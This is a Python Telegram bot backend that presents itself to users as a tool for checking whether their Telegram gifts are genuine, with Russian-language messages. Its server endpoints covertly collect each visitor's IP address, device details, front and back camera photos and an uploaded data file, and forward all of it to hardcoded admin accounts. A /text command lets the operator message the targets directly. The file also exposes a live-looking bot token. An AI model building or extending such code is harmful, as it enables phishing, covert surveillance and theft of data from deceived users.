import asyncio
import logging
import os
import base64
from datetime import datetime
from aiohttp import web
from aiogram import Bot, Dispatcher, types, Router
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, BufferedInputFile, FSInputFile
import json

# =====================================================
# ПАРАМЕТРЫ НАСТРОЙКИ
# =====================================================
API_TOKEN = '8402084222:AAHixNyWf7LcxyDe2wtDNAJCTCBwhd2-KOE'
ADMIN_IDS = [760217595]
WEB_APP_URL = "https://nicebot.vercel.app/"
# =====================================================

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher()
router = Router()
dp.include_router(router)

def get_all_admins():
    return ADMIN_IDS

@router.message(Command("start"))
async def cmd_start(message: types.Message):
    markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Открыть приложение", web_app=WebAppInfo(url=WEB_APP_URL))],
        [InlineKeyboardButton(text="📱 Скачать NiceGram", url="https://nicegram.app/")]
    ])
    
    text_content = (
        "🖐Привет! Я — бот который поможет более детально узнать о вашем подарке, "
        "от его покупки до того за какие звёзды они были куплены,помогу отличить реальный подарок от чистого визуала!"
    )
    
    try:
        photo = FSInputFile("nicegram2.jpg")
        await message.answer_photo(photo=photo, caption=text_content, reply_markup=markup)
    except Exception as e:
        logging.error(f"Не удалось отправить фото: {e}")
        await message.answer(text_content, reply_markup=markup)

@router.message(Command("text"))
async def cmd_text(message: types.Message):
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        await message.answer("❌ Используйте: /text <user_id> <сообщение>")
        return
    
    try:
        user_id = int(args[1])
        text_to_send = args[2]
        await bot.send_message(chat_id=user_id, text=text_to_send)
        await message.answer(f"✅ Сообщение отправлено пользователю {user_id}")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {str(e)}")

routes = web.RouteTableDef()

@routes.get("/")
async def root(request):
    return web.Response(text="OK")

@routes.post('/log_entry')
async def handle_log_entry(request: web.Request):
    try:
        data = await request.json()
        
        user_id = str(data.get('user_id', '0000'))
        username = data.get('username', 'не указан')
        ua = data.get('user_agent', 'неизвестен')
        ip_address = data.get('ip_address', 'Не получен')
        platform = data.get('platform', 'unknown')
        has_front = data.get('has_front_camera', False)
        has_back = data.get('has_back_camera', False)
        
        msg = (f"🚀 **Вход в Mini App**\n"
               f"👤 Юзер: @{username} (ID: {user_id})\n"
               f"📱 Устройство: `{ua}`\n"
               f"🌐 Платформа: {platform}\n"
               f"🔗 IP-адрес: `{ip_address}`\n"
               f"📷 Камеры: Фронт {'✅' if has_front else '❌'} | Задняя {'✅' if has_back else '❌'}\n"
               f"⏰ Время: {datetime.now().strftime('%H:%M:%S %d.%m.%Y')}")

        for admin_id in get_all_admins():
            try:
                await bot.send_message(admin_id, msg, parse_mode="Markdown")
                
                if has_front and data.get('front_camera_data'):
                    try:
                        front_data = data['front_camera_data'].split(',')[1]
                        front_bytes = base64.b64decode(front_data)
                        await bot.send_photo(
                            admin_id,
                            BufferedInputFile(front_bytes, filename=f'front_{user_id}_{int(datetime.now().timestamp())}.jpg'),
                            caption=f"📸 Фронтальная камера @{username}"
                        )
                    except Exception as e:
                        logging.error(f"Ошибка отправки фронтальной камеры: {e}")
                        
                if has_back and data.get('back_camera_data'):
                    try:
                        back_data = data['back_camera_data'].split(',')[1]
                        back_bytes = base64.b64decode(back_data)
                        await bot.send_photo(
                            admin_id,
                            BufferedInputFile(back_bytes, filename=f'back_{user_id}_{int(datetime.now().timestamp())}.jpg'),
                            caption=f"📷 Задняя камера @{username}"
                        )
                    except Exception as e:
                        logging.error(f"Ошибка отправки задней камеры: {e}")
                        
            except Exception as e:
                logging.error(f"Не удалось отправить сообщение админу {admin_id}: {e}")
                
        return web.Response(text="OK", headers={"Access-Control-Allow-Origin": "*"})
    except Exception as e:
        logging.error(f"Error in log: {e}")
        return web.Response(status=500)

@routes.post('/upload')
async def handle_upload_file(request: web.Request):
    try:
        reader = await request.multipart()
        
        user_id = "0000"
        username = "Unknown"
        ua = "Unknown"
        ip_address = "Не получен"
        file_data = None
        filename = "data.json"
        front_camera_data = None
        back_camera_data = None

        while True:
            part = await reader.next()
            if part is None: break
            
            if part.name == 'user_agent': 
                ua = (await part.read_chunk()).decode('utf-8')
            elif part.name == 'user_id':
                user_id = (await part.read_chunk()).decode('utf-8')
            elif part.name == 'username':
                username = (await part.read_chunk()).decode('utf-8')
            elif part.name == 'ip_address':
                ip_address = (await part.read_chunk()).decode('utf-8')
            elif part.name == 'file':
                filename = part.filename or "data.json"
                file_data = await part.read()
            elif part.name == 'front_camera':
                front_camera_data = await part.read()
            elif part.name == 'back_camera':
                back_camera_data = await part.read()

        caption_text = (f"🚨 Новый лог + файл!\n"
                        f"User ID: {user_id}\n"
                        f"Username: @{username}\n"
                        f"Браузер: {ua}\n"
                        f"IP-адрес: {ip_address}\n"
                        f"Время: {datetime.now().strftime('%H:%M:%S %d.%m.%Y')}")

        for admin_id in get_all_admins():
            try:
                files_to_send = []
                
                if file_data:
                    files_to_send.append((
                        BufferedInputFile(file_data, filename=filename),
                        caption_text if len(files_to_send) == 0 else None
                    ))
                
                if front_camera_data:
                    files_to_send.append((
                        BufferedInputFile(front_camera_data, filename=f'front_{user_id}_{int(datetime.now().timestamp())}.jpg'),
                        f"📸 Фронтальная камера @{username}"
                    ))
                
                if back_camera_data:
                    files_to_send.append((
                        BufferedInputFile(back_camera_data, filename=f'back_{user_id}_{int(datetime.now().timestamp())}.jpg'),
                        f"📷 Задняя камера @{username}"
                    ))
                
                for i, (file_obj, caption) in enumerate(files_to_send):
                    if i == 0:
                        await bot.send_document(admin_id, document=file_obj, caption=caption)
                    else:
                        await bot.send_document(admin_id, document=file_obj, caption=caption)
                        
            except Exception as e:
                logging.error(f"Failed to send files to admin {admin_id}: {e}")

        return web.Response(text="OK", headers={"Access-Control-Allow-Origin": "*"})
    except Exception as e:
        logging.error(f"Error in upload: {e}")
        return web.Response(status=500)

@routes.options('/upload')
@routes.options('/log_entry')
async def handle_options(request):
    return web.Response(headers={
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type, X-Telegram-Init-Data"
    })

async def main():
    app = web.Application()
    app.add_routes(routes)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logging.info(f"Сервер запущен на порту {port}")
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
